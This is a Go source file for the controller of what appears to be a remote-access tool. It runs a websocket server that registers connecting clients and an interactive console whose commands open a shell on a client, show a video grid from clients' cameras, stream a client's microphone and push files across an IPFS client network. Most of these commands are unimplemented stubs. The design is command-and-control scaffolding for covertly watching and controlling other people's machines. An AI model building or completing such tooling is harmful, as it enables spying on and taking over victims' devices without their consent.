package main

import (
	"flag"
	"fmt"
	"net/http"
	"strconv"
	"time"

	"github.com/gorilla/websocket"
	"gopkg.in/abiosoft/ishell.v2"
)

var port = flag.String("port", "8080", "Inbound connection port.")
var database = flag.String("db", "", "File path for persistent JSON file.")
var verbose = flag.Bool("verbose", false, "Display extra logging.")

var shell = ishell.New()

var upgrader = websocket.Upgrader{}

func main() {
	flag.Parse()

	go startServer()

	shell.Println(`
 _________  ___   ___   ______
/________/\/__/\ /__/\ /_____/\
\__.::.__\/\::\ \\  \ \\::::_\/_
   \::\ \   \::\/_\ .\ \\:\/___/\
    \::\ \   \:: ___::\ \\::___\/_
     \::\ \   \: \ \\::\ \\:\____/\
      \__\/    \__\/ \::\/ \_____\/
 ______   ______   ________   ______    ______   ______   ___ __ __   ______
/_____/\ /_____/\ /_______/\ /_____/\  /_____/\ /_____/\ /__//_//_/\ /_____/\
\::::_\/_\::::_\/_\::: _  \ \\:::_ \ \ \::::_\/_\:::_ \ \\::\| \| \ \\::::_\/_
 \:\/___/\\:\/___/\\::(_)  \ \\:(_) ) )_\:\/___/\\:\ \ \ \\:.      \ \\:\/___/\
  \:::._\/ \::___\/_\:: __  \ \\: __  \ \\_::._\:\\:\ \ \ \\:.\-/\  \ \\::___\/_
   \:\ \    \:\____/\\:.\ \  \ \\ \  \ \ \ /____\:\\:\_\ \ \\. \  \  \ \\:\____/\
 ___\_\/  ___\_____\/_\__\/\__\/_\_\/ \_\/ \_____\/ \_____\/ \__\/ \__\/ \_____\/
/_____/\ /_______/\/_/\ /_/\ /_____/\
\::::_\/_\__.::._\/\:\ \\ \ \\::::_\/_
 \:\/___/\  \::\ \  \:\ \\ \ \\:\/___/\
  \:::._\/  _\::\ \__\:\_/.:\ \\::___\/_
   \:\ \   /__\::\__/\\ ..::/ / \:\____/\
    \_\/   \________\/ \___/_(   \_____\/
`)

	shell.AddCmd(&ishell.Cmd{
		Name: "ping",
		Help: "Sends ping",
		Func: cmdPing,
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "set_filter",
		Help: "Sets global filters for subsequent commands (ex. os=mac).",
		Func: cmdDefault,
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "list",
		Help: "List active clients.",
		Func: cmdList,
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "client_list_sync",
		Help: "Ping each client and sync the local list with updated data.",
		Func: cmdDefault,
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "shell",
		Help: "Opens shell on a specific client.",
		Func: cmdDefault,
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "upload",
		Help: "Uploads the given file path to the ipfs client network.",
		Func: cmdDefault,
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "file_list",
		Help: "List files in client ipfs network.",
		Func: cmdDefault,
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "monitor",
		Help: "Open a video grid from clients that match the filter.",
		Func: cmdDefault,
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "listen",
		Help: "Open an audio stream from a client microphone.",
		Func: cmdDefault,
	})

	shell.Run()
}

func acceptClient(w http.ResponseWriter, r *http.Request) {
	ws, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		REPLLog(fmt.Sprintf("Connection Issue: %s", err.Error()), 1)
		return
	}

	conn := &Conn{send: make(chan []byte, 256), ws: ws, IsActive: true}

	go conn.writePump()

	REPLLog("Client connected!", 0)

	var client *Client
	var cid int64 = 0

	if r.Header.Get("X-Client-ID") != "" {
		cid, err = strconv.ParseInt(r.Header.Get("X-Client-ID"), 10, 64)
	}

	client, err = ClientIndex.getClientByID(cid)
	if err != nil {
		client = ClientIndex.addClient(0, conn)
		client.Send("Welcome, New Client")
	}

	conn.readCallback = func(conn *Conn, message string) {
		//client.Connection.send <- []byte("Active")

		//conn.readCallback = nil
	}

	conn.readPump()
}

func REPLLog(message string, level int) {
	if level > 0 {
		if *verbose {
			shell.Println("[LOG]: " + message)
		}
	} else {
		shell.Println("[LOG]: " + message)
	}
}

func startServer() {
	if *database != "" {
		if err := ClientIndex.fileLoad(*database); err != nil {
			fmt.Println(err.Error())
		}

		go func() {
			for {
				dur, _ := time.ParseDuration("5m")
				time.Sleep(dur)

				if err := ClientIndex.fileSave(*database); err != nil {
					fmt.Println(err.Error())
				}
			}
		}()
	}

	dur, _ := time.ParseDuration("2s")
	time.Sleep(dur)

	REPLLog("Starting server and accepting connections...", 0)

	http.HandleFunc("/ready", acceptClient)
	http.ListenAndServe("localhost:"+*port, nil)
}
